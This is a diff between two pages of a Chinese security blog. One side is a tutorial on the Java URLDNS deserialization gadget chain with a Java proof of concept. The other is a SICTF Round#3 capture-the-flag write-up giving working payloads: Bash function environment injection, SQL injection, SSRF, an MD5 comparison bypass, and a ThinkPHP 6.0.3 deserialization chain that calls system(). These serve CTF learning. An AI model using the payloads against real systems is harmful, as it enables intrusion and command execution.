@@ -13,7 +13,7 @@
 	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
   <title>
     
-      java反序列化——URLDNS链 | Infernity&#39;s Blog
+      SICTF Round#3 | Infernity&#39;s Blog
     
   </title>
   <meta name="author" content="Infernity">
@@ -100,7 +100,7 @@
 	<!-- Page title -->
 	<p>
 		
-			「java反序列化——URLDNS链」
+			「SICTF Round#3」
 		
 	</p>
 
@@ -246,8 +246,8 @@
 	<div id="layout-post">
 		<div class="article-title">
 			
-	<a href="/2024/03/29/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%94%E2%80%94URLDNS%E9%93%BE/" itemprop="url">
-		java反序列化——URLDNS链
+	<a href="/2024/02/17/SICTF-Round3/" itemprop="url">
+		SICTF Round#3
 	</a>
 
 		</div>
@@ -263,8 +263,8 @@
 
 	更新于
 
-	<a href="/2024/03/29/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%94%E2%80%94URLDNS%E9%93%BE/" itemprop="url">
-		<time datetime="2024-03-29T06:01:24.000Z" itemprop="dateUpdated">
+	<a href="/2024/02/17/SICTF-Round3/" itemprop="url">
+		<time datetime="2024-02-17T08:19:35.000Z" itemprop="dateUpdated">
 	  		2024-03-30
 	  </time>
 	</a> 
@@ -276,8 +276,8 @@
 				
 	<i class="icon-price-tags"></i>
 	
-		<a href="/tags/JAVA/" class=" ">
-			JAVA
+		<a href="/tags/WPs/" class=" ">
+			WPs
 		</a>
 	
 		
@@ -286,7 +286,7 @@
 			
 
 	
-    <span class="leancloud_visitors" id="/2024/03/29/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%94%E2%80%94URLDNS%E9%93%BE/_visitors" data-url="/2024/03/29/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%94%E2%80%94URLDNS%E9%93%BE/" data-title="java反序列化——URLDNS链">
+    <span class="leancloud_visitors" id="/2024/02/17/SICTF-Round3/_visitors" data-url="/2024/02/17/SICTF-Round3/" data-title="SICTF Round#3">
        	<i class="icon-eye"></i>
        	热度
         
@@ -298,7 +298,7 @@
 
 
 	
-    <span class="leancloud_likes" id="/2024/03/29/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%94%E2%80%94URLDNS%E9%93%BE/_likes" data-url="/2024/03/29/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%94%E2%80%94URLDNS%E9%93%BE/" data-title="java反序列化——URLDNS链" rel="unlike">
+    <span class="leancloud_likes" id="/2024/02/17/SICTF-Round3/_likes" data-url="/2024/02/17/SICTF-Round3/" data-title="SICTF Round#3" rel="unlike">
         <i class="icon-heart"></i>
         喜欢
         <i class="leancloud_likes_count" id="leancloud_likes_count">0</i>
@@ -308,37 +308,58 @@
 		</div>
 
 		<div class="article-content" id="article-content">
-			<h2 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h2><p>根据反序列化的一般要求，首先URL类肯定是需要能实现反序列化的接口的。</p>
-<p><img src="/img/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%94%E2%80%94URLDNS%E9%93%BE/%E5%9B%BE%E7%89%87.png" alt="图片.png"></p>
-<p>而在URL类里的hashcode方法里，会先进行一个判断，如果不是-1，那么就进入URLStreamHandler类里的hashCode方法：</p>
-<p><img src="/img/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%94%E2%80%94URLDNS%E9%93%BE/%E5%9B%BE%E7%89%87(1).png" alt="图片.png"></p>
-<p><img src="/img/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%94%E2%80%94URLDNS%E9%93%BE/%E5%9B%BE%E7%89%87(2).png" alt="图片.png"></p>
-<p>而在这个方法里，会执行getHostAddress方法，这是根据域名解析IP地址的函数。</p>
-<p><img src="/img/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%94%E2%80%94URLDNS%E9%93%BE/%E5%9B%BE%E7%89%87(3).png" alt="图片.png"></p>
-<p>结合DNS的相关知识，也就是说只要走到这个函数，就一定会发出DNS请求。</p>
-<p>同样的，hashMap类也实现了序列化接口，<img src="/img/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%94%E2%80%94URLDNS%E9%93%BE/%E5%9B%BE%E7%89%87(4).png" alt="图片.png"></p>
-<p>在hashMap类也重写了readObject，里面也调用了hashCode方法，也就会发出DNS请求。</p>
-<p><img src="/img/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%94%E2%80%94URLDNS%E9%93%BE/%E5%9B%BE%E7%89%87(5).png" alt="图片.png"></p>
-<p>所以链子是这样的：</p>
-<p>new hashMap—&gt;hashmap.put(new URL(“这里放url”),1)—&gt;serialize—&gt;unserialize发出DNS请求</p>
-<h2 id="问题："><a href="#问题：" class="headerlink" title="问题："></a>问题：</h2><p>但是这样写有个问题，运行代码后发现只有在序列化的时候收到了一次DNS请求，而在反序列化的时候反而收不到DNS请求，这是因为hashMap.put方法里同样也调用了hash方法：</p>
-<p><img src="/img/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%94%E2%80%94URLDNS%E9%93%BE/image-20240328111827604.png" alt="image-20240328112125969.png"></p>
-<p><img src="/img/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%94%E2%80%94URLDNS%E9%93%BE/image-20240328112125969.png" alt="image-20240328112136169.png"></p>
-<p>如果不修改hashCode的值，那么我们传入的url就会触发DNS请求，并被hash编码，此后并不能触发反序列化。</p>
-<h2 id="思考："><a href="#思考：" class="headerlink" title="思考："></a>思考：</h2><p>结合前面hashCode的-1判断，不难想到：如果能修改hashCode的值，那么就可以绕过put时hash的触发，而在put之后再把hashCode改回来，就完成整条链子了。</p>
-<h2 id="解决："><a href="#解决：" class="headerlink" title="解决："></a>解决：</h2><p>我们可以通过反射，修改对象属性的值。</p>
-<p>最后的链子就是：</p>
-<p>new hashMap—&gt;X—&gt;hashmap.put(new URL(“填url”),1)—&gt;Y—&gt;serialize—&gt;unserialize发出DNS请求</p>
-<p>X 为url.getClass()获取url类—&gt;getDeclaredField(“hashCode”)获取属性hashCode—&gt;set(url,1234)修改hashCode的值不为-1</p>
-<p>Y 为set(url,-1)改回hashCode的值</p>
-<h4 id="POC："><a href="#POC：" class="headerlink" title="POC："></a>POC：</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLDNS</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException&#123;         <span class="comment">//用writeObject写序列化文件。</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        HashMap&lt;URL,Integer&gt; hashmap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;URL, Integer&gt;();    <span class="comment">//新建hashmap对象</span></span><br><span class="line">        <span class="comment">//这里不要发起请求，把url对象的hashCode改成不是-1</span></span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;https://www.baidu.com&quot;</span>);   <span class="comment">//新建URL的对象</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> url.getClass();    <span class="comment">//获取URL对象的类</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">hashcodefield</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);    <span class="comment">//获取URL对象的类中的hashCode属性</span></span><br><span class="line">        hashcodefield.setAccessible(<span class="literal">true</span>);     <span class="comment">//因为hashCode是private的变量，所以需要设置</span></span><br><span class="line">        hashcodefield.set(url,<span class="number">1234</span>);    <span class="comment">//设置hashCode值1234</span></span><br><span class="line">        hashmap.put(url,<span class="number">1</span>);</span><br><span class="line">        <span class="comment">//通过反射 改变已有对象属性</span></span><br><span class="line">        hashcodefield.set(url,-<span class="number">1</span>);  <span class="comment">//这里把hashCode值改回-1</span></span><br><span class="line">        serialize(hashmap);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+			<p>by:Infernity</p>
+<h1 id="100％-upload"><a href="#100％-upload" class="headerlink" title="100％_upload"></a>100％_upload</h1><p>可真气死我了这道题，没注意看url，跟着标题走，一直在文件上传，一直在绕过滤，他要过滤也不过滤全，留个.user.ini没过滤，就一直围绕这个想办法，结果……</p>
+<p><img src="/img/SICTF2024/1.png" alt="图片.png"></p>
+<p>打开题目，很明显的提示，index.php里有Include函数，那么我们直接上传一个jpg马，然后包含他就出来了。</p>
+<p><img src="/img/SICTF2024/2.png" alt="图片.png"></p>
+<p><strong>SICTF{ea391e30-b67e-4a5d-97ca-7c00f1bc107b}</strong> </p>
+<h1 id="Not-just-unserialize"><a href="#Not-just-unserialize" class="headerlink" title="Not just unserialize"></a>Not just unserialize</h1><p>新知识点，利用环境变量注入。</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/h0cksr/p/16189733.html">https://www.cnblogs.com/h0cksr/p/16189733.html</a></p>
+<p>前面的反序列化这里不再赘述。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">start</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$welcome</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$you</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SE</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$year</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CR</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$last</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$newyear</span>=<span class="string">&#x27;</span></span><br><span class="line"><span class="string">    worries&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ET</span></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">start</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;welcome=<span class="keyword">new</span> <span class="title function_ invoke__">SE</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;welcome-&gt;year=<span class="keyword">new</span> <span class="title function_ invoke__">CR</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;welcome-&gt;year-&gt;last=<span class="keyword">new</span> <span class="title function_ invoke__">ET</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure>
 
-<h4 id="关于hashcodefield-set-url-1234"><a href="#关于hashcodefield-set-url-1234" class="headerlink" title="关于hashcodefield.set(url,1234);"></a>关于hashcodefield.set(url,1234);</h4><p><img src="/img/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%94%E2%80%94URLDNS%E9%93%BE/image-20240328112136169.png" alt="image-20240328111827604.png"></p>
-<p>set方法的第一个参数是属性所对应的对象，这里属性是hashcodefield，对象是url，值是1234</p>
+<p>&#x2F;^.<em>(worries).</em>$&#x2F;</p>
+<p>这个可以在前面加个空格绕过。</p>
+<p>主要是这一段：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;get&#x27;</span>] <span class="keyword">as</span> <span class="variable">$inject</span> =&gt; <span class="variable">$rce</span>)&#123;</span><br><span class="line">            <span class="title function_ invoke__">putenv</span>(<span class="string">&quot;<span class="subst">&#123;$inject&#125;</span>=<span class="subst">&#123;$rce&#125;</span>&quot;</span>);</span><br><span class="line">        &#125; </span><br></pre></td></tr></table></figure>
+
+<p>这里环境变量注入要看看上面的文章，有点复杂。</p>
+<p>这里直接get[BASH_FUNC_echo%%]&#x3D;() { cat &#x2F;f*; }</p>
+<p>即可拿到flag。</p>
+<h1 id="hacker"><a href="#hacker" class="headerlink" title="hacker"></a>hacker</h1><p>这道题考查sql无列名注入。</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_46230316/article/details/106668182">https://blog.csdn.net/m0_46230316/article/details/106668182</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;/**/union/**/select/**/`2`/**/from/**/(select/**/1,2/**/union/**/select/**/*/**/from/**/flag)/**/as/**/a%23</span><br></pre></td></tr></table></figure>
+
+<p>过滤了空格，经过测试，一共有两列，而flag肯定在第二列，所以是<code>2</code></p>
+<p><strong>SICTF{4fa6acc5-9d2c-4af8-908c-53b66839b019}</strong></p>
+<h1 id="EZ-SSRF"><a href="#EZ-SSRF" class="headerlink" title="EZ_SSRF"></a>EZ_SSRF</h1><p>他说有另一个文件，直接开扫！找到一个admin.php，进去看看</p>
+<p><img src="/img/SICTF2024/3.png" alt="图片.png"></p>
+<p>意思是我们需要把ip改成127.0.0.1</p>
+<p>这里正好原文里给了curl</p>
+<p><img src="/img/SICTF2024/4.png" alt="图片.png"></p>
+<p>那直接以127.0.0.1开头进去就拿到flag了。</p>
+<p>O:6:”client”:1:{s:3:”url”;s:26:”<a target="_blank" rel="noopener" href="http://127.0.0.1/admin.php%22;%7D">http://127.0.0.1/admin.php&quot;;}</a></p>
+<p>最后base64解密</p>
+<p><img src="/img/SICTF2024/5.png" alt="图片.png"></p>
+<p><strong>SICTF{af8d34d5-22c4-414d-a78e-b65f587712f5}</strong></p>
+<h1 id="Oyst3rPHP"><a href="#Oyst3rPHP" class="headerlink" title="Oyst3rPHP"></a>Oyst3rPHP</h1><p>最讨厌藏东西的题了，开局先扫，扫出来一个<a target="_blank" rel="noopener" href="http://www.zip这是网站备份文件,里面会有源码,在app/controller/%E9%87%8C%E6%89%BE%E5%88%B0%E6%BA%90%E7%A0%81%EF%BC%8C%E5%AE%A1%E8%AE%A1%E6%BA%90%E7%A0%81%EF%BC%8C%E7%AC%AC%E4%B8%80%E6%AD%A5">www.zip这是网站备份文件，里面会有源码，在app/controller/里找到源码，审计源码，第一步</a></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$right</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;left&#x27;</span>];</span><br><span class="line"><span class="variable">$left</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;right&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$right</span> !== <span class="variable">$left</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$right</span>) == <span class="title function_ invoke__">md5</span>(<span class="variable">$left</span>))&#123;</span><br></pre></td></tr></table></figure>
+
+<p>传?left&#x3D;240610708&amp;right&#x3D;QLTHNDT</p>
+<p>第二步</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/.+?THINKPHP/is&#x27;</span>, <span class="variable">$key</span>))&#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">&quot;Oysters don&#x27;t want you to eat&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$key</span>, <span class="string">&#x27;603THINKPHP&#x27;</span>) === <span class="literal">false</span>)&#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">&quot;！！！Oysters don&#x27;t want you to eat！！！&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>一般只有一个preg_match的判断，里面是一个die函数，用回溯次数绕过可以解，下面stripos函数需要我们的参数里有603THINKPHP，所以传一百万个a+603THINKPHP即可。</p>
+<p>第三步就是反序列化了，这是thinkphp6.0.3有现成的poc，在网上一搜第一个就是</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">concern</span>;</span><br><span class="line"> <span class="class"><span class="keyword">trait</span> <span class="title">Attribute</span></span></span><br><span class="line"><span class="class"> </span>&#123;</span><br><span class="line">     <span class="keyword">private</span> <span class="variable">$data</span> = [<span class="string">&quot;key&quot;</span>=&gt;<span class="string">&quot;cat /Oyst3333333r.php&quot;</span>];</span><br><span class="line">     <span class="keyword">private</span> <span class="variable">$withAttr</span> = [<span class="string">&quot;key&quot;</span>=&gt;<span class="string">&quot;system&quot;</span>];</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">namespace</span> <span class="title class_">think</span>;</span><br><span class="line"> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"> </span>&#123;</span><br><span class="line">     <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">Attribute</span>;</span><br><span class="line">     <span class="keyword">private</span> <span class="variable">$lazySave</span> = <span class="literal">true</span>;</span><br><span class="line">     <span class="keyword">protected</span> <span class="variable">$withEvent</span> = <span class="literal">false</span>;</span><br><span class="line">     <span class="keyword">private</span> <span class="variable">$exists</span> = <span class="literal">true</span>;</span><br><span class="line">     <span class="keyword">private</span> <span class="variable">$force</span> = <span class="literal">true</span>;</span><br><span class="line">     <span class="keyword">protected</span> <span class="variable">$name</span>;</span><br><span class="line">     <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$obj</span>=<span class="string">&quot;&quot;</span></span>)</span>&#123;</span><br><span class="line">         <span class="variable language_">$this</span>-&gt;name=<span class="variable">$obj</span>;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>;</span><br><span class="line"> <span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"> </span>&#123;&#125;</span><br><span class="line"> <span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Pivot</span>();</span><br><span class="line"> <span class="variable">$b</span>=<span class="keyword">new</span> <span class="title class_">Pivot</span>(<span class="variable">$a</span>);</span><br><span class="line"> <span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>));</span><br></pre></td></tr></table></figure>
+
+<p>post传参拿到flag</p>
+<p><strong>SICTF{c35c6cef-3fbb-41d3-9a53-1191b957a9f1}</strong></p>
 	
 		</div>
 		
-		<div id="current-post-cover" data-scr="/img/computer.jpg"></div>
+		<div id="current-post-cover" data-scr="/img/background/2.jpg"></div>
 
 		<!-- relate post, comment...-->
 		<div class="investment-container">
@@ -353,8 +374,12 @@
 	<span>
 		<a id="totop-post-page">返回顶部</a>
 		
+			<a href="/2024/02/20/Hgame-2024-week-4/" title="Hgame 2024 week 4" rel="prev">
+				&laquo;上一篇
+			</a>
 		
-			<a href="/2024/03/25/NKCTF2024/" title="NKCTF2024" rel="next">
+		
+			<a href="/2024/02/13/Hgame-2024-week-3/" title="Hgame 2024 week 3" rel="next">
 				下一篇&raquo;
 			</a>
 			
@@ -480,31 +505,6 @@ https://blog.csdn.net/huangyongkang666/...
 			
 					<li>
 						<div class="relate-post-text">
-							<a class="relate-post-title" href="/2024/02/17/SICTF-Round3/" title="SICTF Round#3">
-								SICTF Round#3			
-							</a>
-							<p class="relate-post-date">
-								<i class="fa fa-calendar"></i>
-								二月 17日, 2024				
-							</p>
-							<p class="relate-post-content">
-								by:Infernity
-100％_upload可真气死我了这道题，没注意看url，跟着标题走，一直在文件上传，一直在绕过滤，他要过滤也不过滤全，留个.user.ini没过滤，就一直围绕这个想办法，结果……
-
-打开题目，很明显的提示，...
-							</p>
-						</div>
-
-						<div class="relate-post-cover">
-							<a href="/2024/02/17/SICTF-Round3/" title="SICTF Round#3">				
-								
-								<img class="lazy" src="/img/lazy.gif" data-src="/img/background/2.jpg" alt="SICTF Round#3"/>
-							</a>
-						</div>
-					</li>												
-			
-					<li>
-						<div class="relate-post-text">
 							<a class="relate-post-title" href="/2024/02/13/Hgame-2024-week-3/" title="Hgame 2024 week 3">
 								Hgame 2024 week 3			
 							</a>
@@ -599,6 +599,33 @@ referer:vidar.club
 							<a href="/2024/01/31/Hgame%202024%20week%201/" title="Hgame 2024 week 1">				
 								
 								<img class="lazy" src="/img/lazy.gif" data-src="/img/Hgame_2024/HgameCTF2024.png" alt="Hgame 2024 week 1"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2024/03/29/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%94%E2%80%94URLDNS%E9%93%BE/" title="java反序列化——URLDNS链">
+								java反序列化——URLDNS链			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								三月 29日, 2024				
+							</p>
+							<p class="relate-post-content">
+								原理：根据反序列化的一般要求，首先URL类肯定是需要能实现反序列化的接口的。
+
+而在URL类里的hashcode方法里，会先进行一个判断，如果不是-1，那么就进入URLStreamHandler类里的hashCode方法：
+
+
+而在这...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2024/03/29/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%94%E2%80%94URLDNS%E9%93%BE/" title="java反序列化——URLDNS链">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/computer.jpg" alt="java反序列化——URLDNS链"/>
 							</a>
 						</div>
 					</li>												
